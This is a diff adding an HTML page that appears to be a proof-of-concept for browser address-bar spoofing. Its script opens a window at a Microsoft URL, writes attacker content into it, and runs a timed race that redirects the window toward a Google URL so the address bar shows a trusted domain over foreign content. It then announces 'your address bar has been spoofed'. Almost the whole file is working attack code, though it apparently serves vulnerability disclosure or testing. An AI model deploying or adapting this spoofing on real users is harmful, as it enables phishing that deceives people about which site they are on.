@@ -1,0 +1,37 @@
+<html> 
+<head> 
+    <meta name="viewport" content="width=device-width, initial-scale=1"> 
+</head> 
+<body> 
+    <a id="spoof-button" href="javascript:window.open('https://apple.com/','x');" onclick="startSpoof()">Click Here</a> 
+    
+    <div id="new-content-area"></div>
+
+</body> 
+<script> 
+let windowSpoof; 
+
+function race() { 
+    try { 
+        windowSpoof.location.href !== 'about:blank'; 
+    } catch (e) { 
+        windowSpoof.location.href='https://www.google.com:82'; 
+    } 
+} 
+
+function startSpoof() { 
+    // 1. Function
+    windowSpoof = window.open("https://www.microsoft.com:82","x"); 
+    windowSpoof.document.write("<h2>Load</h2>"); 
+    setInterval('race()', 1000);
+
+    // 2. Remove the button
+    const button = document.getElementById("spoof-button");
+    button.style.display = "none";
+
+    // New Content
+    const container = document.getElementById("new-content-area");
+    container.innerHTML = "<h1>your address bar has been spoofed</h1>";
+} 
+</script> 
+</html>
